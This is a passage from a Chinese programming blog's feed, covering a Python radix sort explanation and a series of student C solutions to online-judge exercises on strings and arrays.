排序分成子组，对后面的关键码继续这样的排序分组，直到按最右位关键码 k = d对各子组排序后。</p></li><li><p><strong>最低位优先</strong> (Least Significant Digit first)法，简称LSD法：先从k = d开始排序，再对k = d-1进行排序，依次重复，直到对k = 1排序后便得到一个有序序列。</p></li></ul><p><strong>代码</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RadixSort</span><span class="params">(list)</span>:</span></span><br><span class="line">    i = <span class="number">0</span>                                    <span class="comment">#初始为个位排序</span></span><br><span class="line">    n = <span class="number">1</span>                                     <span class="comment">#最小的位数置为1（包含0）</span></span><br><span class="line">    max_num = max(list) <span class="comment">#得到带排序数组中最大数</span></span><br><span class="line">    <span class="keyword">while</span> max_num &gt; <span class="number">10</span>**n: <span class="comment">#得到最大数是几位数</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        bucket = &#123;&#125; <span class="comment">#用字典构建桶</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            bucket.setdefault(x, []) <span class="comment">#将每个桶置空</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> list: <span class="comment">#对每一位进行排序</span></span><br><span class="line">            radix =int((x / (<span class="number">10</span>**i)) % <span class="number">10</span>) <span class="comment">#得到每位的基数</span></span><br><span class="line">            bucket[radix].append(x) <span class="comment">#将对应的数组元素加入到相 #应位基数的桶中</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> len(bucket[k]) != <span class="number">0</span>: <span class="comment">#若桶不为空</span></span><br><span class="line">                <span class="keyword">for</span> y <span class="keyword">in</span> bucket[k]: <span class="comment">#将该桶中每个元素</span></span><br><span class="line">                    list[j] = y <span class="comment">#放回到数组中</span></span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span>  list</span><br></pre></td></tr></table></figure><p><strong>算法评价</strong></p><p><strong>基数排序是稳定的排序算法</strong>。</p><p>因为每个桶内的元素个数是未知的，所以需要借助链表结构来实施分配时向桶内仍记录的过程。</p><p>借助桶编号（键）经过多次分配和采集，最终得到一个有序序列，在这个算法排序过程中，没有经过任何记录的比较，因此基数排序是很独特的排序算法。</p><p>待排序列为n个记录，d个关键码，关键码的取值范围为radix，其中，一趟分配</p><p>时间复杂度为 O(n)，一趟收集时间复杂度为O(radix)，共进行d趟分配和收集，所以链式基数排序的时间复杂度为 O(d · (n+radix) ) 。</p><p>注意这不是说这个时间复杂度一定优于O(n·log(n))，因为 d 的大小一般会受到 n 的影响。 </p><p>采用链表或线性数组存储n个记录，自然地每个记录在每趟分配的时候需要临时申请一个内存空间记录下来，此时需要的空间复杂度为O(n)；并且，每次分配时，每个桶中可能含有多条记录，每个桶再形成一个链表，再占用额外的内存空间 。</p><p><strong>算法比较</strong></p><p>基数排序 vs 计数排序 vs 桶排序</p><p>这三种排序算法都利用了桶的概念，但对桶的使用方法上有明显差异：</p><ul><li>基数排序：根据键值的每位数字来分配桶；</li><li>计数排序：每个桶只存储单一键值；</li><li>桶排序：每个桶存储一定范围的数值;</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;python-排序算法&quot;&gt;&lt;a href=&quot;#python-排序算法&quot; class=&quot;headerlink&quot; title=&quot;python 排序算法&quot;&gt;&lt;/a&gt;python 排序算法&lt;/h1&gt;&lt;h2 id=&quot;0-相关知识&quot;&gt;&lt;a href=&quot;#0-相关知识&quot; cla
      
    
    </summary>
    
    
      <category term="python" scheme="https://mercer5.github.io/categories/python/"/>
    
    
      <category term="算法" scheme="https://mercer5.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="python" scheme="https://mercer5.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>xdoj</title>
    <link href="https://mercer5.github.io/2019/12/14/xdoj/"/>
    <id>https://mercer5.github.io/2019/12/14/xdoj/</id>
    <published>2019-12-14T02:48:29.000Z</published>
    <updated>2020-08-24T15:30:09.772Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xdoj"><a href="#xdoj" class="headerlink" title="xdoj"></a>xdoj</h1><p>==仅用于复习==</p><h2 id="字符串数组练习"><a href="#字符串数组练习" class="headerlink" title="字符串数组练习"></a>字符串数组练习</h2><h3 id="处理字符串"><a href="#处理字符串" class="headerlink" title="处理字符串"></a>处理字符串</h3><p>问题描述<br>从键盘输入一个字符串，将该字符串按下述要求处理后输出：<br>  将ASCII码大于原首字符的各字符按原来相互间的顺序关系集中在原首字符的左边，<br>  将ASCII码小于等于原首字符的各字符按升序集中在原首字符的右边。</p><p>输入说明<br>输入一行字符串,字符串c不长度超过100.</p><p>输出说明<br>输出处理后的一行字符串</p><p>输入样例<br>aQWERsdfg7654!@#$hjklTUIO3210X98aY</p><p>输出样例<br>sdfghjkla!#$0123456789@EIOQRTUWXYa</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> c[<span class="number">100</span>], left[<span class="number">100</span>], right[<span class="number">100</span>],<span class="built_in">string</span>[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> i, j,k,l;</span><br><span class="line"><span class="keyword">char</span> t;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">char</span>* str, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"></span><br><span class="line">gets_s(c, <span class="number">100</span>);</span><br><span class="line">t = c[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>, j = <span class="number">0</span>, k = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(c); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (c[i] &gt; t)</span><br><span class="line">left[j++] = c[i];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">right[k++] = c[i];</span><br><span class="line">&#125;</span><br><span class="line">sort(right, k);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>, l = <span class="number">0</span>; i &lt; j; i++)</span><br><span class="line"><span class="built_in">string</span>[l++] = left[i];</span><br><span class="line"><span class="built_in">string</span>[l++] = t;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line"><span class="built_in">string</span>[l++] = right[i];</span><br><span class="line"><span class="built_in">string</span>[l] = <span class="string">'\0'</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="built_in">string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">char</span>* str, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"><span class="keyword">char</span> t;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n - i; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (str[j] &gt; str[j + <span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line">t = str[j];</span><br><span class="line">str[j] = str[j + <span class="number">1</span>];</span><br><span class="line">str[j + <span class="number">1</span>] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="寻找最长的行"><a href="#寻找最长的行" class="headerlink" title="寻找最长的行"></a>寻找最长的行</h3><p>问题描述<br>寻找若干行文本中最长的一行</p><p>输入说明<br>输入为多个字符串(每个字符串长度不超过100个字符)，每个字符串占一行，输入的行为“<strong><em>end</em></strong>”时表示输入结束</p><p>输出说明<br>输出其中最长的一行长度后换行再输出最长行的内容，如果最长行不止一个，则输出其中的第一行。</p><p>输入样例    </p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abce</span><br><span class="line">abdf dlfd</span><br><span class="line">***<span class="keyword">end</span>***</span><br></pre></td></tr></table></figure><p>输出样例<br>9<br>abdf dlfd </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100</span>], <span class="built_in">end</span>[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> len, <span class="built_in">max</span>;</span><br><span class="line">gets_s(s, <span class="number">100</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(<span class="built_in">end</span>, s);</span><br><span class="line"><span class="built_in">max</span> = <span class="built_in">strlen</span>(s);</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">strcmp</span>(s, <span class="string">"***end***"</span>))</span><br><span class="line">&#123;</span><br><span class="line">gets_s(s, <span class="number">100</span>);</span><br><span class="line">len = <span class="built_in">strlen</span>(s);</span><br><span class="line"><span class="keyword">if</span> (len &gt; <span class="built_in">max</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">max</span> = len;</span><br><span class="line"><span class="built_in">strcpy</span>(<span class="built_in">end</span>, s);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>, <span class="built_in">max</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="built_in">end</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串压缩"><a href="#字符串压缩" class="headerlink" title="字符串压缩"></a>字符串压缩</h3><p>问题描述<br>有一种简单的字符串压缩算法，对于字符串中连续出现的同一个英文字符，用该字符加上连续出现的次数来表示（连续出现次数小于3时不压缩）。<br>例如，字符串aaaaabbbabaaaaaaaaaaaaabbbb可压缩为a5b3aba13b4。<br>请设计一个程序，将采用该压缩方法得到的字符串解压缩，还原出原字符串并输出。</p><p>输入说明<br>输入数据为一个字符串（长度不大于50，只包含字母和数字），表示压缩后的字符串</p><p>输出说明<br>在一行上输出解压缩后的英文字符串（长度不超过100），最后换行。</p><p>输入样例<br>a5b3aba13b4</p><p>输出样例<br>aaaaabbbabaaaaaaaaaaaaabbbb</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">50</span>],ch;</span><br><span class="line"><span class="keyword">int</span> i,j,num;</span><br><span class="line">num = <span class="number">0</span>;</span><br><span class="line">gets_s(a, <span class="number">50</span>);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">isalpha</span>(a[i]))</span><br><span class="line">&#123;</span><br><span class="line">ch = a[i];</span><br><span class="line"><span class="built_in">putchar</span>(ch);</span><br><span class="line">num = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">num = num * <span class="number">10</span> + (a[i]-<span class="string">'0'</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">isdigit</span>(a[i + <span class="number">1</span>]))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; num<span class="number">-1</span>; j++)</span><br><span class="line"><span class="built_in">putchar</span>(ch);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="一维二维数组练习"><a href="#一维二维数组练习" class="headerlink" title="一维二维数组练习"></a>一维二维数组练习</h2><h3 id="0-1矩阵"><a href="#0-1矩阵" class="headerlink" title="0-1矩阵"></a>0-1矩阵</h3><p>问题描述<br>查找一个只包含0和1的矩阵中每行最长的连续1序列。</p><p>输入说明<br>输入第一行为两个整数m和n(0&lt;=m,n&lt;=100)表示二维数组行数和列数，其后为m行数据，每行n个整数（0或1），输入数据中不会出现同一行有两个最长1序列的情况。</p><p>输出说明<br>找出每一行最长的连续1序列，输出其起始位置(从0开始计算)和结束位置(从0开始计算)，如果这一行没有1则输出两个-1,然后换行。</p><p>输入样例<br>5 6<br>1 0 0 1 1 0<br>0 0 0 0 0 0<br>1 1 1 1 1 1<br>1 1 1 0 1 1<br>0 0 1 1 0 0</p><p>输出样例<br>3 4<br>-1 -1<br>0 5<br>0 2<br>2 3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, m, num[<span class="number">100</span>][<span class="number">100</span>],i,j;</span><br><span class="line"><span class="keyword">int</span> start, <span class="built_in">end</span>, * p1 = &amp;start, * p2 = &amp;<span class="built_in">end</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span>* n, <span class="keyword">int</span> len, <span class="keyword">int</span>* p1, <span class="keyword">int</span>* p2)</span></span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;m);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num[i][j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">find</span>(num[i], m, p1, p2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>, start, <span class="built_in">end</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span>* n, <span class="keyword">int</span> len, <span class="keyword">int</span>* p1, <span class="keyword">int</span>* p2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, count, <span class="built_in">max</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>,count=<span class="number">0</span>,<span class="built_in">max</span>=<span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i != len - <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (n[i] == <span class="number">1</span>)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="built_in">max</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">max</span> = count;</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line">*p1 = i - <span class="built_in">max</span>;</span><br><span class="line">*p2 = i - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (n[i] == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="built_in">max</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">max</span> = count;</span><br><span class="line">*p1 = i-<span class="built_in">max</span>+<span class="number">1</span>;</span><br><span class="line">*p2 = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="built_in">max</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">max</span> = count;</span><br><span class="line">*p1 = i - <span class="built_in">max</span>;</span><br><span class="line">*p2 = i<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">max</span> == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">*p1 = <span class="number">-1</span>;</span><br><span class="line">*p2 = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="等差数列"><a href="#等差数列" class="headerlink" title="等差数列"></a>等差数列</h3><p>问题描述<br>　请写一个程序，判断给定整数序列能否构成一个等差数列。</p><p>输入说明<br>　输入数据由两行构成，第一行只有一个整数n（n&lt;100），表示序列长度（该序列中整数的个数）；<br>第二行为n个整数，每个整数的取值区间都为<code>[-32768~32767]</code>，整数之间以空格间隔。</p><p>输出说明<br>　对输入数据进行判断，不能构成等差数列输出“no”，能构成等差数列输出表示数列公差（相邻两项的差）的绝对值的一个整数。</p><p>输入样例<br>样例1输入<br>6<br>23 15 4 18 35 11<br>样例2输入<br>5<br>2 6 8 4 10<br>输出样例<br>样例1输出<br>no<br>样例2输出<br>2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, num[<span class="number">100</span>], i,delta,flag=<span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>* n, <span class="keyword">int</span> l)</span></span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp; n);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;num[i]);</span><br><span class="line">sort(num, n);</span><br><span class="line">delta = num[<span class="number">1</span>] - num[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">2</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (delta != num[i] - num[i - <span class="number">1</span>])</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, delta);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"no"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>* n, <span class="keyword">int</span> l)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j, t;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; l; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; l - i; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (n[j] &gt; n[j + <span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line">t = n[j];</span><br><span class="line">n[j] = n[j + <span class="number">1</span>];</span><br><span class="line">n[j + <span class="number">1</span>] = t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="马鞍点"><a href="#马鞍点" class="headerlink" title="马鞍点"></a>马鞍点</h3><p>问题描述<br>若一个矩阵中的某元素在其所在行最小而在其所在列最大，则该元素为矩阵的一个马鞍点。<br>请写一个程序，找出给定矩阵的马鞍点。</p><p>输入说明<br>输入数据第一行只有两个整数m和n<code>（0&lt;m&lt;100,0&lt;n&lt;100）</code>，分别表示矩阵的行数和列数；<br>接下来的m行、每行n个整数表示矩阵元素（矩阵中的元素互不相同），整数之间以空格间隔。</p><p>输出说明<br>在一行上输出马鞍点的行号、列号（行号和列号从0开始计数）及元素的值（用一个空格分隔），之后换行；<br>若不存在马鞍点，则输出一个字符串“no”后换行。</p><p>输入样例<br>4 3<br>11 13 121<br>407 72 88<br>23 58 1<br>134 30 62</p><p>输出样例<br>1 1 72</p><p>输入样例</p><p>2 2<br>1 1<br>1 1</p><p>输出样例</p><p>no</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//end用于确定马鞍点,t暂存最大最小值,index为最大最小值对应的横/纵坐标</span></span><br><span class="line"><span class="keyword">int</span> n, m, i, j, num[<span class="number">100</span>][<span class="number">100</span>], <span class="built_in">end</span>[<span class="number">100</span>][<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, t,index,flag=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d"</span>, &amp;n, &amp;m);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j++)</span><br><span 